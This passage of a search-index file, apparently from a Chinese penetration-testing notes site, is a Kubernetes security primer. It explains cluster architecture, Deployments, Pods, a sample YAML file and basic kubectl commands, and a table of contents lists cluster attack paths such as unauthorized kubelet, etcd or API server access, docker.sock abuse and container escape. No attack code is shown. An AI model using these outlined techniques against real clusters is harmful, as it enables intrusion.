Flannel\u7f51\u7edc\u63d2\u4ef6\u9ed8\u8ba4\u4f7f\u752810.244.0.0/16\u7f51\u7edc\uff0cCalico\u9ed8\u8ba4\u4f7f\u7528192.168.0.0/16\u7f51\u7edc\uff0c\u5982\u679c\u51fa\u73b0\u5728\u8fd9\u4e9b\u7f51\u6bb5\u4e2d\uff08\u7279\u522b\u662f10.244\u7f51\u6bb5\uff09\u90a3\u4e48\u53ef\u4ee5\u521d\u6b65\u5224\u65ad\u4e3a\u96c6\u7fa4\u4e2d\u7684\u4e00\u4e2apod\u3002pod\u91cc\u9762\u547d\u4ee4\u5f88\u5c11\uff0c\u53ef\u4ee5\u901a\u8fc7hostname -I(\u5927\u5199i)\u6765\u67e5\u770bip\u5730\u5740 ref https://developer.aliyun.com/article/765449#slide-5 https://xz.aliyun.com/t/4276#toc-4 https://tttang.com/archive/1389/ https://payloads.online/archivers/2021-07-20/1/ https://www.freebuf.com/articles/database/316788.html https://www.freebuf.com/vuls/196993.html https://github.com/pen4uin/cloud-native-security https://www.updateweb.cn/zwfec/item-367.html https://kuboard.cn/learning/ (\u975e\u5e38\u597d\u7684\u4e2d\u6587\u6559\u7a0b) https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/ (k8s\u5b98\u65b9\u6559\u7a0b\uff0c\u6709\u4ea4\u4e92\u5f0f\u64cd\u4f5c\u754c\u9762\uff0c\u7a0d\u5fae\u6709\u70b9\u4e0d\u597d\u7684\u662f\u6709\u4e9b\u5730\u65b9\u6ca1\u6709\u4e2d\u6587) \u5173\u4e8e\u8282\u70b9\u7684\u4e00\u822c\u6027\u4fe1\u606f\uff0c\u4f8b\u5982\u5185\u6838\u7248\u672c\u3001Kubernetes \u7248\u672c\uff08kubelet \u548c kube-proxy \u7248\u672c\uff09\u3001 Docker \u7248\u672c\uff08\u5982\u679c\u4f7f\u7528\u4e86\uff09\u548c\u64cd\u4f5c\u7cfb\u7edf\u540d\u79f0\u3002\u8fd9\u4e9b\u4fe1\u606f\u7531 kubelet \u4ece\u8282\u70b9\u4e0a\u641c\u96c6\u800c\u6765\u3002 \u63cf\u8ff0\u8282\u70b9\u4e0a\u7684\u53ef\u7528\u8d44\u6e90\uff1aCPU\u3001\u5185\u5b58\u548c\u53ef\u4ee5\u8c03\u5ea6\u5230\u8282\u70b9\u4e0a\u7684 Pod \u7684\u4e2a\u6570\u4e0a\u9650\u3002 Ready \u5982\u8282\u70b9\u662f\u5065\u5eb7\u7684\u5e76\u5df2\u7ecf\u51c6\u5907\u597d\u63a5\u6536 Pod \u5219\u4e3a True\uff1bFalse \u8868\u793a\u8282\u70b9\u4e0d\u5065\u5eb7\u800c\u4e14\u4e0d\u80fd\u63a5\u6536 Pod\uff1bUnknown \u8868\u793a\u8282\u70b9\u63a7\u5236\u5668\u5728\u6700\u8fd1 node-monitor-grace-period \u671f\u95f4\uff08\u9ed8\u8ba4 40 \u79d2\uff09\u6ca1\u6709\u6536\u5230\u8282\u70b9\u7684\u6d88\u606f DiskPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u7684\u7a7a\u95f2\u7a7a\u95f4\u4e0d\u8db3\u4ee5\u7528\u4e8e\u6dfb\u52a0\u65b0 Pod, \u5426\u5219\u4e3a False MemoryPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u5b58\u5728\u5185\u5b58\u538b\u529b\uff0c\u5373\u8282\u70b9\u5185\u5b58\u53ef\u7528\u91cf\u4f4e\uff0c\u5426\u5219\u4e3a False PIDPressure\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u5b58\u5728\u8fdb\u7a0b\u538b\u529b\uff0c\u5373\u8282\u70b9\u4e0a\u8fdb\u7a0b\u8fc7\u591a\uff1b\u5426\u5219\u4e3a False NetworkUnavailable\u4e3aTrue\u5219\u8868\u793a\u8282\u70b9\u7f51\u7edc\u914d\u7f6e\u4e0d\u6b63\u786e\uff1b\u5426\u5219\u4e3a False HostName\uff1a\u7531\u8282\u70b9\u7684\u5185\u6838\u8bbe\u7f6e\u3002\u53ef\u4ee5\u901a\u8fc7 kubelet \u7684 \u2014hostname-override \u53c2\u6570\u8986\u76d6\u3002 ExternalIP\uff1a\u901a\u5e38\u662f\u8282\u70b9\u7684\u53ef\u5916\u90e8\u8def\u7531\uff08\u4ece\u96c6\u7fa4\u5916\u53ef\u8bbf\u95ee\uff09\u7684 IP \u5730\u5740\u3002 InternalIP\uff1a\u901a\u5e38\u662f\u8282\u70b9\u7684\u4ec5\u53ef\u5728\u96c6\u7fa4\u5185\u90e8\u8def\u7531\u7684 IP \u5730\u5740\u3002 \u300a\u4e91\u662f\u4ec0\u4e48- \u5b9a\u4e49 - Microsoft Azure\u300b","title":"k8s\u5b89\u5168 \u626b\u76f2"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s","text":"","title":"k8s\u5b89\u5168 \u626b\u76f2"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_1","text":"\u4e91 \u4f55\u4e3ak8s \uff1f K8S \u67b6\u6784\u7b80\u8ff0 \u642d\u5efaK8S K8S\u7684\u57fa\u7840\u6982\u5ff5 \u90e8\u7f72\u2014\u2014Deployment POD\u4e0eNode \u670d\u52a1\u2014\u2014Service \u4f38\u7f29\u2014\u2014Scaling \u6eda\u52a8\u66f4\u65b0\u2014\u2014Rolling Update K8S\u5b89\u5168 \u521d\u59cb\u8bbf\u95ee \u4e91\u8d26\u53f7AK\u6cc4\u9732 \u6076\u610f\u955c\u50cf API Server\u672a\u6388\u6743 configfile \u6cc4\u9732 \u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5165\u4fb5 \u79c1\u6709\u955c\u50cf\u5e93\u66b4\u9732 docker.sock \u5229\u7528 kubelet \u672a\u6388\u6743 etcd \u672a\u6388\u6743 \u6267\u884c *\u76ee\u5f55\u6302\u8f7d\u9003\u9038 \u5229\u7528Service Account\u8fde\u63a5API Server\u6267\u884c\u6307\u4ee4 \u6301\u4e45\u5316 \u6743\u9650\u63d0\u5347 \u63a2\u6d4b \u662f\u5426\u5728\u5bb9\u5668\u73af\u5883\u4e2d ref","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#_2","text":"\u4e91\u7684\u5b9a\u4e49\u770b\u4f3c\u6a21\u7cca\uff0c\u4f46\u672c\u8d28\u4e0a\uff0c\u5b83\u662f\u4e00\u4e2a\u7528\u4e8e\u63cf\u8ff0\u5168\u7403\u670d\u52a1\u5668\u7f51\u7edc\u7684\u672f\u8bed\uff0c\u6bcf\u4e2a\u670d\u52a1\u5668\u90fd\u6709\u4e00\u4e2a\u72ec\u7279\u7684\u529f\u80fd\u3002\u4e91\u4e0d\u662f\u4e00\u4e2a\u7269\u7406\u5b9e\u4f53\uff0c\u800c\u662f\u4e00\u4e2a\u5e9e\u5927\u7684\u5168\u7403\u8fdc\u7a0b\u670d\u52a1\u5668\u7f51\u7edc\uff0c\u5b83\u4eec\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u65e8\u5728\u4f5c\u4e3a\u5355\u4e00\u7684\u751f\u6001\u7cfb\u7edf\u8fd0\u884c\u3002\u8fd9\u4e9b\u670d\u52a1\u5668\u8bbe\u8ba1\u7528\u4e8e\u5b58\u50a8\u548c\u7ba1\u7406\u6570\u636e\u3001\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u4ea4\u4ed8\u5185\u5bb9/\u670d\u52a1\uff08\u5982\u89c6\u9891\u77ed\u7247\u3001Web \u90ae\u4ef6\u3001\u529e\u516c\u5ba4\u751f\u4ea7\u529b\u8f6f\u4ef6\u6216\u793e\u4ea4\u5a92\u4f53\uff09\u3002\u4e0d\u662f\u4ece\u672c\u5730\u6216\u4e2a\u4eba\u8ba1\u7b97\u673a\u8bbf\u95ee\u6587\u4ef6\u548c\u6570\u636e\uff0c\u800c\u662f\u901a\u8fc7\u4efb\u4f55\u652f\u6301 Internet \u7684\u8bbe\u5907\u5728\u7ebf\u8bbf\u95ee - \u8fd9\u4e9b\u4fe1\u606f\u5728\u5fc5\u8981\u65f6\u968f\u65f6\u968f\u5730\u53ef\u7528\u3002 \u4f01\u4e1a\u91c7\u7528 4 \u79cd\u4e0d\u540c\u7684\u65b9\u6cd5\u90e8\u7f72\u4e91\u8d44\u6e90\u3002\u5b58\u5728\u4e00\u4e2a \u516c\u6709\u4e91 \uff0c\u5b83\u901a\u8fc7 Internet \u5171\u4eab\u8d44\u6e90\u5e76\u5411\u516c\u4f17\u63d0\u4f9b\u670d\u52a1\uff1b\u4e00\u4e2a \u79c1\u6709\u4e91 \uff0c\u5b83\u4e0d\u8fdb\u884c\u5171\u4eab\u4e14\u7ecf\u7531\u901a\u5e38\u672c\u5730\u6258\u7ba1\u7684\u79c1\u6709\u5185\u90e8\u7f51\u7edc\u63d0\u4f9b\u670d\u52a1\uff1b\u4e00\u4e2a \u6df7\u5408\u4e91 \uff0c\u5b83\u6839\u636e\u5176\u76ee\u7684\u5728\u516c\u6709\u4e91\u548c\u79c1\u6709\u4e91\u4e4b\u95f4\u5171\u4eab\u670d\u52a1\uff1b\u4ee5\u53ca\u4e00\u4e2a\u793e\u533a\u4e91\uff0c\u5b83\u4ec5\u5728\u7ec4\u7ec7\u4e4b\u95f4\uff08\u4f8b\u5982\u4e0e\u653f\u5e9c\u673a\u6784\uff09\u5171\u4eab\u8d44\u6e90\u3002","title":"\u4e91"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s_1","text":"k8s\u5373Kubernetes\u3002 \u5176\u4e3agoogle\u5f00\u53d1\u6765\u88ab\u7528\u4e8e\u5bb9\u5668\u7ba1\u7406\u7684\u5f00\u6e90\u5e94\u7528\u7a0b\u5e8f\uff0c\u53ef\u5e2e\u52a9\u521b\u5efa\u548c\u7ba1\u7406\u5e94\u7528\u7a0b\u5e8f\u7684\u5bb9\u5668\u5316\u3002 \u7528\u4e00\u4e2a\u7684\u4f8b\u5b50\u6765\u63cf\u8ff0\uff1a\"\u5f53\u865a\u62df\u5316\u5bb9\u5668Docker\u6709\u592a\u591a\u8981\u7ba1\u7406\u7684\u65f6\u5019\uff0c\u624b\u52a8\u7ba1\u7406\u5c31\u4f1a\u5f88\u9ebb\u70e6\uff0c\u4e8e\u662f\u6211\u4eec\u4fbf\u53ef\u4ee5\u901a\u8fc7k8s\u6765\u7b80\u5316\u6211\u4eec\u7684\u7ba1\u7406\"","title":"\u4f55\u4e3ak8s \uff1f"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s_2","text":"\u6211\u4eec\u5728\u4e0a\u6587\u5df2\u7ecf\u77e5\u9053\uff0cK8S\u662f\u7528\u4e8e\u7ba1\u7406\u865a\u62df\u5316\u5bb9\u5668\u7684\u4e00\u4e2a\u5e94\u7528\u7cfb\u7edf\uff0c\u5728\u8fd9\u5c0f\u8282\u4e2d\u4f1a\u7740\u91cd\u8bb2\u8ff0K8S\u7684\u67b6\u6784\u3001\u5b9e\u73b0\u539f\u7406\u3002 \u4e0b\u56fe\u4e3aK8S\u67b6\u6784\u7684\u6982\u89c8\uff1a k8s\u4e3b\u8981\u7531\u8f83\u5c11\u7684master\u8282\u70b9\u4ee5\u53ca\u5176\u5bf9\u5e94\u7684\u591a\u4e2aNode\u8282\u70b9\u7ec4\u6210\u3002master\u7528\u4e8e\u5bf9Node\u8282\u70b9\u8fdb\u884c\u63a7\u5236\u7ba1\u7406\uff0c\u4e00\u4e2ak8s\u96c6\u7fa4\u4e2d\u81f3\u5c11\u8981\u6709\u4e00\u53f0master\u8282\u70b9\u3002 Master\u8282\u70b9\u4e2d\u5305\u542b\u5f88\u591a\u7684\u7ec4\u4ef6\uff0c\u4e3b\u8981\u4e3a\u5982\u4e0b etcd \u5b83\u5b58\u50a8\u96c6\u7fa4\u4e2d\u6bcf\u4e2a\u8282\u70b9\u53ef\u4ee5\u4f7f\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u5b83\u662f\u4e00\u4e2a\u9ad8\u53ef\u7528\u6027\u952e\u503c\u5b58\u50a8\uff0c\u53ef\u4ee5\u5728\u591a\u4e2a\u8282\u70b9\u4e4b\u95f4\u5206\u5e03\u3002\u53ea\u6709Kubernetes API\u670d\u52a1\u5668\u53ef\u4ee5\u8bbf\u95ee\u5b83\uff0c\u56e0\u4e3a\u5b83\u53ef\u80fd\u5177\u6709\u4e00\u4e9b\u654f\u611f\u4fe1\u606f\u3002\u8fd9\u662f\u4e00\u4e2a\u5206\u5e03\u5f0f\u952e\u503c\u5b58\u50a8\uff0c\u6240\u6709\u4eba\u90fd\u53ef\u4ee5\u8bbf\u95ee\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u5b58\u50a8\u8282\u70b9\u4fe1\u606f API server Kubernetes\u662f\u4e00\u4e2aAPI\u670d\u52a1\u5668\uff0c\u5b83\u4f7f\u7528API\u5728\u96c6\u7fa4\u4e0a\u63d0\u4f9b\u6240\u6709\u64cd\u4f5c\u3002API\u670d\u52a1\u5668\u5b9e\u73b0\u4e86\u4e00\u4e2a\u63a5\u53e3\uff0c\u8fd9\u610f\u5473\u7740\u4e0d\u540c\u7684\u5de5\u5177\u548c\u5e93\u53ef\u4ee5\u8f7b\u677e\u5730\u4e0e\u5176\u8fdb\u884c\u901a\u4fe1\u3002Kubeconfig\u662f\u4e0e\u53ef\u7528\u4e8e\u901a\u4fe1\u7684\u670d\u52a1\u5668\u7aef\u5de5\u5177\u4e00\u8d77\u7684\u8f6f\u4ef6\u5305\u3002\u5b83\u516c\u5f00\u4e86Kubernetes API \u7b80\u800c\u8a00\u4e4b\uff1a\u8bfb\u53d6\u4e0e\u89e3\u6790\u8bf7\u6c42\u6307\u4ee4\u7684\u4e2d\u67a2 Controller Manage \u8be5\u7ec4\u4ef6\u8d1f\u8d23\u8c03\u8282\u7fa4\u96c6\u72b6\u6001\u5e76\u6267\u884c\u4efb\u52a1\u7684\u5927\u591a\u6570\u6536\u96c6\u5668\u3002\u901a\u5e38\uff0c\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u5728\u975e\u7ec8\u6b62\u5faa\u73af\u4e2d\u8fd0\u884c\u7684\u5b88\u62a4\u7a0b\u5e8f\uff0c\u8be5\u5b88\u62a4\u7a0b\u5e8f\u8d1f\u8d23\u6536\u96c6\u4fe1\u606f\u5e76\u5c06\u5176\u53d1\u9001\u5230API\u670d\u52a1\u5668\u3002\u5b83\u81f4\u529b\u4e8e\u83b7\u53d6\u7fa4\u96c6\u7684\u5171\u4eab\u72b6\u6001\uff0c\u7136\u540e\u8fdb\u884c\u66f4\u6539\u4ee5\u4f7f\u670d\u52a1\u5668\u7684\u5f53\u524d\u72b6\u6001\u8fbe\u5230\u6240\u9700\u72b6\u6001\u3002\u5173\u952e\u63a7\u5236\u5668\u662f\u590d\u5236\u63a7\u5236\u5668\uff0c\u7aef\u70b9\u63a7\u5236\u5668\uff0c\u540d\u79f0\u7a7a\u95f4\u63a7\u5236\u5668\u548c\u670d\u52a1\u5e10\u6237\u63a7\u5236\u5668\u3002\u63a7\u5236\u5668\u7ba1\u7406\u5668\u8fd0\u884c\u4e0d\u540c\u7c7b\u578b\u7684\u63a7\u5236\u5668\u6765\u5904\u7406\u8282\u70b9\uff0c\u7aef\u70b9\u7b49\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u7ef4\u62a4k8s\u8d44\u6e90 Scheduler \u8fd9\u662fKubernetes master\u7684\u5173\u952e\u7ec4\u4ef6\u4e4b\u4e00\u3002\u5b83\u662f\u4e3b\u670d\u52a1\u5668\u4e2d\u8d1f\u8d23\u5206\u914d\u5de5\u4f5c\u8d1f\u8f7d\u7684\u670d\u52a1\u3002\u5b83\u8d1f\u8d23\u8ddf\u8e2a\u7fa4\u96c6\u8282\u70b9\u4e0a\u5de5\u4f5c\u8d1f\u8f7d\u7684\u5229\u7528\u7387\uff0c\u7136\u540e\u5c06\u5de5\u4f5c\u8d1f\u8f7d\u653e\u5728\u53ef\u7528\u8d44\u6e90\u4e0a\u5e76\u63a5\u53d7\u8be5\u5de5\u4f5c\u8d1f\u8f7d\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u8fd9\u662f\u8d1f\u8d23\u5c06Pod\u5206\u914d\u7ed9\u53ef\u7528\u8282\u70b9\u7684\u673a\u5236\u3002\u8c03\u5ea6\u7a0b\u5e8f\u8d1f\u8d23\u5de5\u4f5c\u8d1f\u8f7d\u5229\u7528\u7387\uff0c\u5e76\u5c06Pod\u5206\u914d\u7ed9\u65b0\u8282\u70b9\u3002 \u7b80\u800c\u8a00\u4e4b\uff1a\u8d1f\u8f7d\u5747\u8861\u8c03\u5ea6\u5668 Node\u8282\u70b9\u4e5f\u5305\u542b\u4e86\u5f88\u591a\u7ec4\u4ef6\uff0c\u4e3b\u8981\u5982\u4e0b Docker Docker\u5f15\u64ce\uff0c\u8fd0\u884c\u7740\u5bb9\u5668\u7684\u57fa\u7840\u73af\u5883 kubelet \u5728\u6bcf\u4e2anode\u8282\u70b9\u90fd\u5b58\u5728\u4e00\u4efd\uff0c\u4e3b\u8981\u6765\u6267\u884c\u5173\u4e8e\u8d44\u6e90\u64cd\u4f5c\u7684\u6307\u4ee4\uff0c\u8d1f\u8d23pod\u7684\u7ef4\u62a4\u3002 kube-proxy \u4ee3\u7406\u670d\u52a1\uff0c\u7528\u4e8e\u8d1f\u8f7d\u5747\u8861\uff0c\u5728\u591a\u4e2apod\u4e4b\u95f4\u505a\u8d1f\u8f7d\u5747\u8861 fluentd \u65e5\u5fd7\u6536\u96c6\u670d\u52a1 pod pod\u662fk8s\u7684\u6700\u5c0f\u670d\u52a1\u5355\u5143\uff0cpod\u5185\u90e8\u624d\u662f\u5bb9\u5668\uff0ck8s\u901a\u8fc7\u64cd\u4f5cpod\u6765\u64cd\u4f5c\u5bb9\u5668\u3002\u4e00\u4e2aNode\u8282\u70b9\u53ef\u4ee5\u6709\u591a\u4e2aPod Pod\u53ef\u4ee5\u8bf4\u662fNode\u8282\u70b9\u4e2d\u6700\u6838\u5fc3\u7684\u90e8\u5206\uff0cPod\u4e5f\u662f\u4e00\u4e2a\u5bb9\u5668\uff0c\u5b83\u662f\u4e00\u4e2a\"\u7528\u6765\u5c01\u88c5\u5bb9\u5668\u7684\u5bb9\u5668\"\u3002\u4e00\u4e2aPod\u4e2d\u5f80\u5f80\u4f1a\u88c5\u8f7d\u591a\u4e2a\u5bb9\u5668\uff0c\u8fd9\u4e9b\u5bb9\u5668\u5171\u7528\u4e00\u4e2a\u865a\u62df\u73af\u5883\uff0c\u5171\u4eab\u7740\u7f51\u7edc\u548c\u5b58\u50a8\u7b49\u8d44\u6e90\u3002 \u8fd9\u4e9b\u5bb9\u5668\u7684\u8d44\u6e90\u5171\u4eab\u4ee5\u53ca\u76f8\u4e92\u4ea4\u4e92\u90fd\u662f\u7531pod\u91cc\u9762\u7684pause\u5bb9\u5668\u6765\u5b8c\u6210\u7684\uff0c\u6bcf\u521d\u59cb\u5316\u4e00\u4e2apod\u65f6\u4fbf\u4f1a\u751f\u6210\u4e00\u4e2apause\u5bb9\u5668\u3002","title":"K8S \u67b6\u6784\u7b80\u8ff0"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s_3","text":"\u6211\u662f\u8ddf\u7740\u8fd9\u4e2a\u6587\u7ae0\u6765\u7684\uff0cK8S\u642d\u5efa\u5f88\u7e41\u7410\u3002\u3002\u3002 https://www.updateweb.cn/zwfec/item-367.html","title":"\u642d\u5efaK8S"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#k8s_4","text":"ref: https://kuboard.cn/learning/ (\u975e\u5e38\u597d\u7684\u4e2d\u6587\u6559\u7a0b) https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/ (k8s\u5b98\u65b9\u6559\u7a0b\uff0c\u6709\u4ea4\u4e92\u5f0f\u64cd\u4f5c\u754c\u9762\uff0c\u7a0d\u5fae\u6709\u70b9\u4e0d\u597d\u7684\u662f\u6709\u4e9b\u5730\u65b9\u6ca1\u6709\u4e2d\u6587)","title":"K8S\u7684\u57fa\u7840\u6982\u5ff5"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#deployment","text":"k8s\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u901a\u8fc7 Deployment\u6765\u90e8\u7f72\u7684\uff0cDeployment\u6765\u6307\u5bfck8s\u5b8c\u6210\u5e94\u7528\u7a0b\u5e8f\u7684\u90e8\u7f72\u548c\u66f4\u65b0\u7ef4\u62a4\u3002 \u6bd4\u5982\u8bf4\uff0c\u5f53Deployment\u5728\u90e8\u7f72\u5e94\u7528\u65f6\uff0cmaster\u8282\u70b9\u4f1a\u9009\u62e9\u6700\u5408\u9002\u7684\u8282\u70b9\u521b\u5efa\u5305\u542b\u76f8\u5e94Container\uff08\u5bb9\u5668\uff09\u7684POD \u53c8\u6bd4\u5982\u8bf4\uff0cDeployment\u4f1a\u76d1\u63a7\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u5f53\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u8282\u70b9\u5b95\u673a\u65f6\uff0c\u5b83\u5c06\u4f1a\u5728\u5224\u65ad\u96c6\u7fa4\u4e2d\u6700\u9002\u5b9c\u91cd\u65b0\u90e8\u7f72\u7684\u5de5\u4f5c\u8282\u70b9\uff0c\u5e76\u5728\u5176\u4e0a\u9762\u91cd\u65b0\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\uff08\u65b0\u521b\u5efa\u7684\u5e94\u7528\u7a0b\u5e8f\u7684POD ip\u548cpod\u540d\u4f1a\u4e0e\u4e4b\u524d\u7684\u4e0d\u540c\uff09\u3002 \u76f8\u5173\u547d\u4ee4\uff1a ## \u67e5\u770b Deployment kubectl get deployments ## \u67e5\u770b Pod kubectl get pods #\u6839\u636eyaml\u6587\u4ef6\u90e8\u7f72 kubectl apply -f nginx-deployment.yaml \u4e00\u4e2ayaml\u6587\u4ef6\u5dee\u4e0d\u591a\u5c31\u957f\u8fd9\u6837 apiVersion: apps/v1 #\u4e0ek8s\u96c6\u7fa4\u7248\u672c\u6709\u5173\uff0c\u4f7f\u7528 kubectl api-versions \u5373\u53ef\u67e5\u770b\u5f53\u524d\u96c6\u7fa4\u652f\u6301\u7684\u7248\u672c kind: Deployment #\u8be5\u914d\u7f6e\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f Deployment metadata: #\u8bd1\u540d\u4e3a\u5143\u6570\u636e\uff0c\u5373 Deployment \u7684\u4e00\u4e9b\u57fa\u672c\u5c5e\u6027\u548c\u4fe1\u606f name: nginx-deployment #Deployment \u7684\u540d\u79f0 labels: #\u6807\u7b7e\uff0c\u53ef\u4ee5\u7075\u6d3b\u5b9a\u4f4d\u4e00\u4e2a\u6216\u591a\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2dkey\u548cvalue\u5747\u53ef\u81ea\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5b9a\u4e49\u591a\u7ec4\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 app: nginx #\u4e3a\u8be5Deployment\u8bbe\u7f6ekey\u4e3aapp\uff0cvalue\u4e3anginx\u7684\u6807\u7b7e spec: #\u8fd9\u662f\u5173\u4e8e\u8be5Deployment\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4f60\u671f\u5f85\u8be5Deployment\u5728k8s\u4e2d\u5982\u4f55\u4f7f\u7528 replicas: 1 #\u4f7f\u7528\u8be5Deployment\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b selector: #\u6807\u7b7e\u9009\u62e9\u5668\uff0c\u4e0e\u4e0a\u9762\u7684\u6807\u7b7e\u5171\u540c\u4f5c\u7528\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 matchLabels: #\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684\u8d44\u6e90 app: nginx template: #\u8fd9\u662f\u9009\u62e9\u6216\u521b\u5efa\u7684Pod\u7684\u6a21\u677f metadata: #Pod\u7684\u5143\u6570\u636e labels: #Pod\u7684\u6807\u7b7e\uff0c\u4e0a\u9762\u7684selector\u5373\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684Pod app: nginx spec: #\u671f\u671bPod\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u5373\u5728pod\u4e2d\u90e8\u7f72\uff09 containers: #\u751f\u6210container\uff0c\u4e0edocker\u4e2d\u7684container\u662f\u540c\u4e00\u79cd - name: nginx #container\u7684\u540d\u79f0 image: nginx:1.7.9 #\u4f7f\u7528\u955c\u50cfnginx:1.7.9\u521b\u5efacontainer\uff0c\u8be5container\u9ed8\u8ba480\u7aef\u53e3\u53ef\u8bbf\u95ee","title":"\u90e8\u7f72\u2014\u2014Deployment"},{"location":"%E6%B8%97%E9%80%8F/%E8%84%86%E5%BC%B1%E5%BA%94%E7%94%A8/%E4%BA%91/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/k8s%E5%AE%89%E5%85%A8%20%E6%89%AB%E7%9B%B2/#podnode","text":"\u4e00\u4e2aPOD\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u5bb9\u5668\uff0c\u8fd9\u4e9b\u5bb9\u5668\u5171\u4eab\u7740POD\u4e0a\u7684\u8d44\u6e90\uff08\u5982\u7f51\u7edcIP\uff0c\u5b58\u50a8\u7a7a\u95f4\u7b49\uff09 POD\u662f\u96c6\u7fa4\u4e0a\u6700\u57fa\u7840\u7684\u5355\u5143 \u6bcf\u4e2aPOD\u5bf9\u4e0e\u5176\u5bf9\u5e94\u7684\u8282\u70b9Node\u7ed1\u5b9a\uff0c\u4e00\u4e2aPOD\u5bf9\u5e94\u7740\u4e00\u4e2aIP\u3002 Pod\u9700\u8981\u5728Node\u4e0a\u8fd0\u884c\uff0c\u4e00\u4e2aNode\u53ef\u4ee5\u8fd0\u884c\u7740\u591a\u4e2aPod\uff0c\u4e00\u4e2aNode\u5bf9\u5e94\u7740\u96c6\u7fa4\u4e2d\u7684\u4e00\u53f0\u673a\u5668\u3002 Node\u8282\u70b9\u7531Master\u8282\u70b9\u7edf\u4e00\u7ba1\u7406\uff0cMaster\u4f1a\u6839\u636e\u5404Node\u7684\u8d44\u6e90\u53ef\u7528\u7a0b\u5ea6\u81ea\u52a8\u8c03\u5ea6Pod\u5230\u4e0d\u540c\u7684Node\u4e0a\u3002 \u518d\u6765\u8bf4\u8bf4Node \u4e00\u4e2a\u8282\u70b9\u7684\u72b6\u6001\u5927\u81f4\u6709\u4ee5\u4e0b\u7684\u4e1c\u897f Addresses Conditions Capacity and Allocatable Info \u5730\u5740 \u72b6\u51b5(conditions \u5b57\u6bb5\u63cf\u8ff0\u4e86\u6240\u6709 Running \u8282\u70b9\u7684\u72b6\u6001) \u5bb9\u91cf\u4e0e\u53ef\u5206\u914d \u4fe1\u606f \u76f8\u5173\u547d\u4ee4 #\u83b7\u53d6\u7c7b\u578b\u4e3aPod\u7684\u8d44\u6e90\u5217\u8868 kubectl get pods #\u83b7\u53d6\u7c7b\u578b\u4e3aNode\u7684\u8d44\u6e90\u5217\u8868 kubectl get nodes ## kubectl describe \u8d44\u6e90\u7c7b\u578b \u8d44\u6e90\u540d\u79f0 #\u67e5\u770b\u540d\u79f0\u4e3anginx-XXXXXX\u7684Pod\u7684\u4fe1\u606f kubectl describe pod nginx-XXXXXX #\u67e5\u770b\u540d\u79f0\u4e3anginx\u7684Deployment\u7684\u4fe1\u606f kubectl describe deployment nginx 